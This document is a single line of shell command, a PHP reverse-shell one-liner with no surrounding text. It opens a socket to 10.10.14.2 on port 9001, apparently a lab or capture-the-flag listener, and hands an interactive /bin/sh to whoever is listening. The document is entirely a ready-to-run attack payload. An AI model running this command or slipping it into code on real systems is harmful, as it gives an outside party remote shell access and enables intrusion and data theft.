php -r '$sock=fsockopen("10.10.14.2",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
